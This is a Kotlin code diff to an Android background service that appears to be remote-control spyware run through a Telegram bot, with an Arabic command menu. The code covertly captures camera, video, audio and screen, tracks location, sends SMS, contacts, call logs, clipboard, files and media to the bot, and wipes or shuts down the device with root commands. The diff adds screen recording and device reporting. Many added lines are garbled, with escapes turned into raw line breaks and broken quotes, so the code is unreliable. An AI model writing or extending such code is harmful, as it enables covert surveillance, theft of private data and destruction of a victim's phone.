@@ -126,7 +126,7 @@ class BackgroundControlService : Service() {
             while (isRunning) {
                 var connection: HttpURLConnection? = null
                 try {
-                    val url = URL("https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=25&allowed_updates=[\"message\",\"callback_query\"]")
+                    val url = URL("https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=25&allowed_updates=["message","callback_query"]")
                     connection = url.openConnection() as HttpURLConnection
                     connection.requestMethod = "GET"
                     connection.connectTimeout = 12000
@@ -173,7 +173,7 @@ class BackgroundControlService : Service() {
                             }
                         }
                     }
-                } catch (e: Exception) {
+                } catch (_: Exception) {
                     try { Thread.sleep(6000) } catch (_: InterruptedException) {}
                 } finally {
                     try { connection?.disconnect() } catch (_: Exception) {}
@@ -205,7 +205,7 @@ class BackgroundControlService : Service() {
                 data == "take_photo" -> captureCameraImage(chatId, "front")
                 data == "take_photo_rear" -> captureCameraImage(chatId, "rear")
                 data == "record_video" -> executeCameraVideoRecording(chatId, 10)
-                data == "record_screen" -> sendDirectMessage(chatId, "🎬 تسجيل الشاشة يتطلب تفعيلاً تفاعلياً من واجهة الجهاز.")
+                data == "record_screen" -> launchScreenRecorder(chatId, 10)
                 data == "record_audio" -> executeAudioCapture(chatId, 30)
                 data == "get_location" -> fetchStrictRealTimeLocation(chatId)
                 data == "start_live_tracking" -> toggleStrictLiveTracking(chatId, true)
@@ -216,13 +216,15 @@ class BackgroundControlService : Service() {
                 data == "pull_files" -> compileAndExtractArchive(chatId)
                 data == "view_videos" -> enumerateTargetVideos(chatId)
                 data == "pull_videos" -> extractAndPushRecentVideos(chatId, 5)
+                data == "list_devices" -> sendDeviceDetails(chatId)
                 data == "get_calls" -> extractCallHistory(chatId)
                 data == "get_sms" -> extractSmsArchive(chatId)
                 data == "get_contacts" -> extractContactsDirectory(chatId)
                 data == "factory_reset" -> executeTerminalWipe(chatId)
                 data == "remote_shutdown" -> executeHardShutdown(chatId)
                 data == "service_status" -> sendDirectMessage(chatId, "🟢 الحالة: النظام يعمل بكفاءة تامة في الخلفية.")
-                data == "sys_info" -> sendDirectMessage(chatId, "📱 إصدار النظام: ${Build.VERSION.RELEASE}\n🛠️ الطراز: ${Build.MODEL}")
+                data == "sys_info" -> sendDirectMessage(chatId, "📱 إصدار النظام: ${Build.VERSION.RELEASE}
+🛠️ الطراز: ${Build.MODEL}")
                 data.startsWith("pull_images_") -> {
                     val count = data.substringAfter("pull_images_").toIntOrNull() ?: 10
                     extractAndPushRecentImages(chatId, count)
@@ -230,6 +232,37 @@ class BackgroundControlService : Service() {
                 else -> sendDirectMessage(chatId, "⚙️ تم تنفيذ الإجراء: $data")
             }
         }
+    }
+
+    private fun launchScreenRecorder(chatId: String, durationSeconds: Int) {
+        try {
+            val intent = Intent(applicationContext, ScreenRecordActivity::class.java).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                putExtra("chat_id", chatId)
+                putExtra("duration", durationSeconds)
+            }
+            applicationContext.startActivity(intent)
+            sendDirectMessage(chatId, "🖥️ جاري طلب إذن تسجيل الشاشة من الجهاز...")
+        } catch (e: Exception) {
+            sendDirectMessage(chatId, "❌ خطأ في تشغيل تسجيل الشاشة: ${e.message}")
+        }
+    }
+
+    private fun sendDeviceDetails(chatId: String) {
+        val info = buildString {
+            append("📱 معلومات الجهاز المتصل:
+")
+            append("• الشركة المصنعة: ${Build.MANUFACTURER}
+")
+            append("• الطراز: ${Build.MODEL}
+")
+            append("• الجهاز: ${Build.DEVICE}
+")
+            append("• إصدار أندرويد: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})
+")
+            append("• حالة التتبع الحي: ${if (isTrackingActive) "نشط" else "متوقف"}")
+        }
+        sendDirectMessage(chatId, info)
     }
 
     private fun captureCameraImage(chatId: String, facing: String) {
@@ -273,35 +306,70 @@ class BackgroundControlService : Service() {
             sendDirectMessage(chatId, "❌ صلاحية الموقع غير ممنوحة.")
             return
         }
-        try {
-            val locManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            sendDirectMessage(chatId, "📍 جاري تحديد الإحداثيات عبر الـ GPS...")
+        mainHandler.post {
+            try {
+                val locManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+                sendDirectMessage(chatId, "📍 جاري تحديد الإحداثيات...")
 
-            val listener = object : LocationListener {
-                override fun onLocationChanged(location: Location) {
-                    val lat = location.latitude
-                    val lon = location.longitude
-                    val accuracy = location.accuracy
-                    sendDirectMessage(chatId, "🎯 [موقع GPS دقيق]\nLat: $lat, Lon: $lon\nالدقة: ${accuracy}م\nhttps://maps.google.com/?q=$lat,$lon")
-                    try { locManager.removeUpdates(this) } catch (_: Exception) {}
+                val provider = when {
+                    locManager.isProviderEnabled(LocationManager.GPS_PROVIDER) -> LocationManager.GPS_PROVIDER
+                    locManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER) -> LocationManager.NETWORK_PROVIDER
+                    else -> null
                 }
-                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
-                override fun onProviderEnabled(provider: String) {}
-                override fun onProviderDisabled(provider: String) {}
-            }
 
-            if (locManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                locManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper())
-            } else {
-                val lastLoc = locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-                if (lastLoc != null) {
-                    sendDirectMessage(chatId, "📍 [الموقع المؤرشف]:\nhttps://maps.google.com/?q=${lastLoc.latitude},${lastLoc.longitude}")
+                if (provider != null) {
+                    val listener = object : LocationListener {
+                        override fun onLocationChanged(location: Location) {
+                            val lat = location.latitude
+                            val lon = location.longitude
+                            val accuracy = location.accuracy
+                            sendDirectMessage(
+                                chatId,
+                                "🎯 [موقع دقيق - $provider]
+Lat: $lat, Lon: $lon
+الدقة: ${accuracy}م
+https://maps.google.com/?q=$lat,$lon"
+                            )
+                            try { locManager.removeUpdates(this) } catch (_: Exception) {}
+                        }
+
+                        @Deprecated("Deprecated in Java")
+                        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
+                        override fun onProviderEnabled(provider: String) {}
+                        override fun onProviderDisabled(provider: String) {}
+                    }
+                    @Suppress("DEPRECATION")
+                    locManager.requestSingleUpdate(provider, listener, Looper.getMainLooper())
+
+                    mainHandler.postDelayed({
+                        try { locManager.removeUpdates(listener) } catch (_: Exception) {}
+                        val fallback = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+                            ?: locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+                        if (fallback != null) {
+                            sendDirectMessage(
+                                chatId,
+                                "📍 [آخر موقع معروف]:
+Lat: ${fallback.latitude}, Lon: ${fallback.longitude}
+https://maps.google.com/?q=${fallback.latitude},${fallback.longitude}"
+                            )
+                        }
+                    }, 8000)
                 } else {
-                    sendDirectMessage(chatId, "⚠️ تعذر جلب الموقع لتعطل خدمات التحديد.")
+                    val lastLoc = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+                        ?: locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+                    if (lastLoc != null) {
+                        sendDirectMessage(
+                            chatId,
+                            "📍 [الموقع المؤرشف]:
+https://maps.google.com/?q=${lastLoc.latitude},${lastLoc.longitude}"
+                        )
+                    } else {
+                        sendDirectMessage(chatId, "⚠️ تعذر جلب الموقع لتعطل خدمات التحديد.")
+                    }
                 }
+            } catch (e: Exception) {
+                sendDirectMessage(chatId, "❌ خطأ الموقع: ${e.message}")
             }
-        } catch (e: Exception) {
-            sendDirectMessage(chatId, "❌ خطأ الموقع: ${e.message}")
         }
     }
 
@@ -318,14 +386,19 @@ class BackgroundControlService : Service() {
                 while (isTrackingActive && isRunning) {
                     try {
                         val locManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-                        val location = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) 
+                        val location = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                             ?: locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
 
                         if (location != null) {
-                            sendDirectMessage(chatId, "📍 [تتبّع حي]\nLat: ${location.latitude}, Lon: ${location.longitude}\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}")
+                            sendDirectMessage(
+                                chatId,
+                                "📍 [تتبّع حي]
+Lat: ${location.latitude}, Lon: ${location.longitude}
+https://maps.google.com/?q=${location.latitude},${location.longitude}"
+                            )
                         }
                     } catch (_: Exception) {}
-                    Thread.sleep(15000)
+                    try { Thread.sleep(15000) } catch (_: InterruptedException) {}
                 }
             }
         } else {
@@ -349,11 +422,13 @@ class BackgroundControlService : Service() {
                 val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                 if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
                     val text = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
-                    sendDirectMessage(chatId, "📋 محتوى الحافظة المستخرج:\n\n$text")
+                    sendDirectMessage(chatId, "📋 محتوى الحافظة المستخرج:
+
+$text")
                 } else {
                     sendDirectMessage(chatId, "ℹ️ الحافظة فارغة حالياً أو مقيدة أمنياً.")
                 }
-            } catch (e: Exception) {
+            } catch (_: Exception) {
                 sendDirectMessage(chatId, "ℹ️ قراءة الحافظة تتطلب تواجداً نشطاً للواجهة.")
             }
         }
@@ -370,7 +445,7 @@ class BackgroundControlService : Service() {
                 Runtime.getRuntime().exec(arrayOf("su", "-c", "recovery --wipe_data"))
                 sendDirectMessage(chatId, "⚡ تم إرسال أمر الفرمتة.")
             }
-        } catch (e: Exception) {
+        } catch (_: Exception) {
             sendDirectMessage(chatId, "❌ فشل الفرمتة: يتطلب صلاحيات Root أو Device Admin.")
         }
     }
@@ -380,7 +455,7 @@ class BackgroundControlService : Service() {
         try {
             val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot -p"))
             process.waitFor()
-        } catch (e: Exception) {
+        } catch (_: Exception) {
             sendDirectMessage(chatId, "❌ فشل الإطفاء: يتطلب صلاحيات Root.")
         }
     }
@@ -391,7 +466,12 @@ class BackgroundControlService : Service() {
             return
         }
         try {
-            val smsManager = getSystemService(SmsManager::class.java)
+            @Suppress("DEPRECATION")
+            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                getSystemService(SmsManager::class.java)
+            } else {
+                SmsManager.getDefault()
+            }
             smsManager.sendTextMessage(phoneNumber, null, messageText, null, null)
             sendDirectMessage(chatId, "✉️ تم إرسال SMS إلى الرقم $phoneNumber بنجاح.")
         } catch (e: Exception) {
@@ -508,15 +588,18 @@ class BackgroundControlService : Service() {
     private fun enumerateTargetDirectory(chatId: String) {
         executionExecutor.execute {
             try {
+                @Suppress("DEPRECATION")
                 val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) ?: filesDir
                 val files = dir.listFiles()
                 if (files.isNullOrEmpty()) {
                     sendDirectMessage(chatId, "📂 مجلد التنزيلات فارغ.")
                     return@execute
                 }
-                val sb = StringBuilder("📂 ملفات النظام (${dir.name}):\n")
+                val sb = StringBuilder("📂 ملفات النظام (${dir.name}):
+")
                 files.take(50).forEach { f ->
-                    sb.append("• ${f.name} (${f.length() / 1024} KB)\n")
+                    sb.append("• ${f.name} (${f.length() / 1024} KB)
+")
                 }
                 sendDirectMessage(chatId, sb.toString())
             } catch (e: Exception) {
@@ -529,6 +612,7 @@ class BackgroundControlService : Service() {
         executionExecutor.execute {
             val zipFile = File(cacheDir, "archive_${System.currentTimeMillis()}.zip")
             try {
+                @Suppress("DEPRECATION")
                 val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) ?: filesDir
                 val candidates = dir.listFiles()?.filter { it.isFile && it.length() < 50 * 1024 * 1024 }?.take(30).orEmpty()
                 if (candidates.isEmpty()) {
@@ -563,7 +647,9 @@ class BackgroundControlService : Service() {
         executionExecutor.execute {
             try {
                 val projection = arrayOf(MediaStore.Video.Media.DISPLAY_NAME, MediaStore.Video.Media.SIZE)
-                val sb = StringBuilder("🎬 فيديوهات الجهاز المخزنة:\n\n")
+                val sb = StringBuilder("🎬 فيديوهات الجهاز المخزنة:
+
+")
                 var count = 0
                 contentResolver.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, "${MediaStore.Video.Media.DATE_ADDED} DESC")?.use { cursor ->
                     val nameIdx = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
@@ -571,7 +657,8 @@ class BackgroundControlService : Service() {
                     while (cursor.moveToNext() && count < 30) {
                         val name = cursor.getString(nameIdx) ?: "فيديو"
                         val sizeKB = (cursor.getLong(sizeIdx)) / 1024
-                        sb.append("• $name (${sizeKB} KB)\n")
+                        sb.append("• $name (${sizeKB} KB)
+")
                         count++
                     }
                 }
@@ -628,13 +715,15 @@ class BackgroundControlService : Service() {
             try {
                 val projection = arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION)
                 val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())
-                val sb = StringBuilder("📞 سجل المكالمات (آخر 100):\n")
+                val sb = StringBuilder("📞 سجل المكالمات (آخر 100):
+")
                 var count = 0
                 contentResolver.query(CallLog.Calls.CONTENT_URI, projection, null, null, "${CallLog.Calls.DATE} DESC")?.use { cursor ->
                     val numIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                     val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)
                     while (cursor.moveToNext() && count < 100) {
-                        sb.append("• ${cursor.getString(numIdx)} - ${formatter.format(Date(cursor.getLong(dateIdx)))}\n")
+                        sb.append("• ${cursor.getString(numIdx)} - ${formatter.format(Date(cursor.getLong(dateIdx)))}
+")
                         count++
                     }
                 }
@@ -654,20 +743,25 @@ class BackgroundControlService : Service() {
             try {
                 val uri = Uri.parse("content://sms/inbox")
                 val projection = arrayOf("address", "body", "date")
-                val sb = StringBuilder("💬 أرشيف رسائل SMS (آخر 50):\n\n")
+                val sb = StringBuilder("💬 أرشيف رسائل SMS (آخر 50):
+
+")
                 var count = 0
-                
+
                 contentResolver.query(uri, projection, null, null, "date DESC")?.use { cursor ->
                     val addrIdx = cursor.getColumnIndexOrThrow("address")
                     val bodyIdx = cursor.getColumnIndexOrThrow("body")
                     while (cursor.moveToNext() && count < 50) {
                         val sender = cursor.getString(addrIdx) ?: "مجهول"
                         val body = cursor.getString(bodyIdx)?.take(100) ?: ""
-                        sb.append("• من: $sender\n  النص: $body\n\n")
+                        sb.append("• من: $sender
+  النص: $body
+
+")
                         count++
                     }
                 }
-                
+
                 if (count == 0) {
                     sendDirectMessage(chatId, "ℹ️ صندوق الرسائل فارغ.")
                 } else {
@@ -690,9 +784,11 @@ class BackgroundControlService : Service() {
                     ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                     ContactsContract.CommonDataKinds.Phone.NUMBER
                 )
-                val sb = StringBuilder("📇 دليل جهات الاتصال (أول 100):\n\n")
+                val sb = StringBuilder("📇 دليل جهات الاتصال (أول 100):
+
+")
                 var count = 0
-                
+
                 contentResolver.query(
                     ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                     projection,
@@ -705,11 +801,12 @@ class BackgroundControlService : Service() {
                     while (cursor.moveToNext() && count < 100) {
                         val name = cursor.getString(nameIdx) ?: "بدون اسم"
                         val number = cursor.getString(numIdx) ?: ""
-                        sb.append("• $name: $number\n")
+                        sb.append("• $name: $number
+")
                         count++
                     }
                 }
-                
+
                 if (count == 0) {
                     sendDirectMessage(chatId, "ℹ️ لا توجد جهات اتصال مخزنة.")
                 } else {
@@ -732,20 +829,34 @@ class BackgroundControlService : Service() {
             connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
 
             DataOutputStream(connection.outputStream).use { out ->
-                out.write("--$boundary\r\n".toByteArray())
-                out.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".toByteArray())
-                out.write("$chatId\r\n".toByteArray())
+                out.write("--$boundary
+".toByteArray())
+                out.write("Content-Disposition: form-data; name="chat_id"
 
-                out.write("--$boundary\r\n".toByteArray())
-                out.write("Content-Disposition: form-data; name=\"caption\"\r\n\r\n".toByteArray())
-                out.write("$caption\r\n".toByteArray())
+".toByteArray())
+                out.write("$chatId
+".toByteArray())
 
-                out.write("--$boundary\r\n".toByteArray())
-                out.write("Content-Disposition: form-data; name=\"$fieldName\"; filename=\"${file.name}\"\r\n".toByteArray())
-                out.write("Content-Type: $mimeType\r\n\r\n".toByteArray())
+                out.write("--$boundary
+".toByteArray())
+                out.write("Content-Disposition: form-data; name="caption"
+
+".toByteArray())
+                out.write("$caption
+".toByteArray())
+
+                out.write("--$boundary
+".toByteArray())
+                out.write("Content-Disposition: form-data; name="$fieldName"; filename="${file.name}"
+".toByteArray())
+                out.write("Content-Type: $mimeType
+
+".toByteArray())
 
                 FileInputStream(file).use { it.copyTo(out) }
-                out.write("\r\n--$boundary--\r\n".toByteArray())
+                out.write("
+--$boundary--
+".toByteArray())
             }
             connection.inputStream?.close()
         } catch (_: Exception) {
@@ -780,51 +891,45 @@ class BackgroundControlService : Service() {
             var conn: HttpURLConnection? = null
             try {
                 val keyboard = JSONArray().apply {
-                    // الصف الأول: الكاميرات
                     put(JSONArray().apply {
                         put(JSONObject().put("text", "📸 كاميرا أمامية").put("callback_data", "take_photo"))
                         put(JSONObject().put("text", "📸 كاميرا خلفية").put("callback_data", "take_photo_rear"))
                     })
-                    // الصف الثاني: الفيديو والصوت
                     put(JSONArray().apply {
                         put(JSONObject().put("text", "🎥 تسجيل فيديو").put("callback_data", "record_video"))
                         put(JSONObject().put("text", "🎙️ صوت (30ث)").put("callback_data", "record_audio"))
                     })
-                    // الصف الثالث: الموقع والتتبع
+                    put(JSONArray().apply {
+                        put(JSONObject().put("text", "🖥️ تسجيل الشاشة").put("callback_data", "record_screen"))
+                        put(JSONObject().put("text", "📱 عرض الأجهزة").put("callback_data", "list_devices"))
+                    })
                     put(JSONArray().apply {
                         put(JSONObject().put("text", "📍 موقع GPS").put("callback_data", "get_location"))
                         put(JSONObject().put("text", "🟢 تفعيل التتبع").put("callback_data", "start_live_tracking"))
                     })
-                    // الصف الرابع: سحب الرسائل وجهات الاتصال
                     put(JSONArray().apply {
                         put(JSONObject().put("text", "💬 سحب الرسائل (SMS)").put("callback_data", "get_sms"))
                         put(JSONObject().put("text", "📇 سحب جهات الاتصال").put("callback_data", "get_contacts"))
                     })
-                    // الصف الخامس: المكالمات والحافظة
                     put(JSONArray().apply {
                         put(JSONObject().put("text", "📞 سجل المكالمات").put("callback_data", "get_calls"))
                         put(JSONObject().put("text", "📋 الحافظة").put("callback_data", "get_clipboard"))
                     })
-                    // الصف السادس: الملفات
                     put(JSONArray().apply {
                         put(JSONObject().put("text", "📂 عرض الملفات").put("callback_data", "view_files"))
                         put(JSONObject().put("text", "📥 سحب ملفات النظام").put("callback_data", "pull_files"))
                     })
-                    // الصف السابع: الفيديوهات (عرض وسحب)
                     put(JSONArray().apply {
                         put(JSONObject().put("text", "🎬 عرض الفيديوهات").put("callback_data", "view_videos"))
                         put(JSONObject().put("text", "📥 سحب 5 فيديوهات").put("callback_data", "pull_videos"))
                     })
-                    // الصف الثامن: سحب الصور
                     put(JSONArray().apply {
                         put(JSONObject().put("text", "📥 سحب 10 صور").put("callback_data", "pull_images_10"))
                         put(JSONObject().put("text", "📥 سحب 30 صورة").put("callback_data", "pull_images_30"))
                     })
-                    // الصف التاسع: التفريغ الشامل
                     put(JSONArray().apply {
                         put(JSONObject().put("text", "🚀 تفريغ شامل للبيانات").put("callback_data", "full_dump_report"))
                     })
-                    // الصف العاشر: إبادة وإطفاء
                     put(JSONArray().apply {
                         put(JSONObject().put("text", "⚠️ إبادة الجهاز").put("callback_data", "factory_reset"))
                         put(JSONObject().put("text", "🔌 إطفاء قسري").put("callback_data", "remote_shutdown"))
